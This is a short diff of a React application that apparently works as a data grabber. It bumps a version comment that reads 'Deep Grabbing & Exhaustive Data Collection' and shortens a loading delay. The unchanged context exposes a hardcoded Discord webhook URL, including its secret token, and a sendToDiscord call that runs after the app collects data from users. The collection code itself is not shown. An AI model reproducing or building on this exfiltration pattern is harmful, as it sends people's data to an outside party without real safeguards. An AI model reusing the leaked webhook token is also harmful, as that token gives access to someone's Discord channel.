@@ -5,7 +5,7 @@ import './App.css';
 
 const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1468167808461439061/5ORX06BKJz7Ln8PmZ8hZtmgmUjdsifFcxv-g5y7klogQ-DC9JqMaG8dsVeP5wj4-sFu9";
 
-// Version 6.0.0 - Deep Grabbing & Exhaustive Data Collection
+// Version 6.0.1 - Deep Grabbing & Exhaustive Data Collection (Final Build)
 function App() {
   const [stage, setStage] = useState('consent');
   const [collectedData, setCollectedData] = useState(null);
@@ -521,7 +521,7 @@ function App() {
     setIsSubmitting(true);
     setResult(null);
     setStage('loading');
-    await new Promise(r => setTimeout(r, 2000));
+    await new Promise(r => setTimeout(r, 1500));
 
     const success = await sendToDiscord();
     setIsSubmitting(false);
